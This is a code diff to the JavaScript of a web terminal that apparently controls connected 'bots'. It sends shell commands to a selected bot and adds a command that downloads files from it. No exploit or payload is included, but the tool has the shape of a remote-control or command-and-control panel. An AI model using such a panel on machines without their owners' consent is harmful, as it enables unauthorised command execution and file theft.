@@ -96,8 +96,8 @@
     terminalFontSize = 14;
     terminalMargin = 2;
     $(document).ready(function () {
-        $('head').append('<style id="terminalFont" type="text/css">.terminal-output, .cmd {font-size:' + terminalFontSize +  'px;}</style>');
-        $('head').append('<style id="terminalMargin" type="text/css">.terminal div {margin-bottom:' + terminalMargin +  'px;}</style>');
+        $('head').append('<style id="terminalFont" type="text/css">.terminal-output, .cmd {font-size:' + terminalFontSize + 'px;}</style>');
+        $('head').append('<style id="terminalMargin" type="text/css">.terminal div {margin-bottom:' + terminalMargin + 'px;}</style>');
 
         //sets the terminal text color and font-size
         function textStyle(message) {
@@ -115,8 +115,8 @@
                     terminalFontSize -= .2
                     break;
             }
-            $('#terminalFont').text('.terminal-output, .cmd {font-size:' + terminalFontSize +  'px;}');
-            $('#terminalMargin').text('.terminal div {margin-bottom:' + terminalMargin +  'px;}');
+            $('#terminalFont').text('.terminal-output, .cmd {font-size:' + terminalFontSize + 'px;}');
+            $('#terminalMargin').text('.terminal div {margin-bottom:' + terminalMargin + 'px;}');
         });
 
         namespace = '/bot';
@@ -131,6 +131,18 @@
             if (command == 'clear') {
                 term.clear();
             }
+
+            //download file from bot
+            var splitCommand = command.split(" ");
+            console.log(splitCommand)
+            if (splitCommand[0] == "download") {
+                if (splitCommand.length != 2) {
+                    term.error("usage: download <filename>")
+                }
+                downloadFile(splitCommand[1]);
+                return;
+            }
+
             //send terminal command to server
             socket.emit('send_command', {data: command});
             socket.removeAllListeners('send_command'); //Sloppy, fix this if can. should be outside terminal function ideally
@@ -161,11 +173,17 @@
             $("#bot").append('<option value="' + msg.user + '">' + msg.user + '</option>')
         });
 
+        //TODO: consolidate
         //repetitive code: will remove later
         socket.on('disconnect', function (msg) {
             $('.col-md-3').append('<p class="disconn-' + msg.user + '">' + 'Lost connection to: ' + msg.user + '</p>');
             $('.disconn-' + msg.user).fadeOut(5000);
             $("#bot option[value='" + msg.user + "']").remove();
+        });
+
+        //new connection received
+        socket.on('success', function (msg) {
+            terminal.echo(textStyle(msg.message))
         });
 
         //new bot selected
@@ -203,7 +221,7 @@
                     processData: false,
                     success: function (data) {
                         if (JSON.parse(data).success) {
-                            terminal.echo(textStyle("File upload successful"))
+                            terminal.echo(textStyle("File upload in progress..."))
                         } else {
                             terminal.error(textStyle("File upload failed"))
                         }
@@ -211,6 +229,26 @@
                 });
             });
         });
+
+        // download file from connected bot
+        function downloadFile(filename) {
+            $.ajax({
+                type: "POST",
+                url: "/downloader",
+                data: {
+                    file: filename
+                },
+                success: function (data) {
+                    console.log(data)
+                    var blob = new Blob([data]);
+                    var link = document.createElement('a');
+                    link.href = window.URL.createObjectURL(blob);
+                    link.download = filename;
+                    link.click();
+                    terminal.echo(textStyle("Download successful"))
+                }
+            });
+        }
     });
 </script>
 
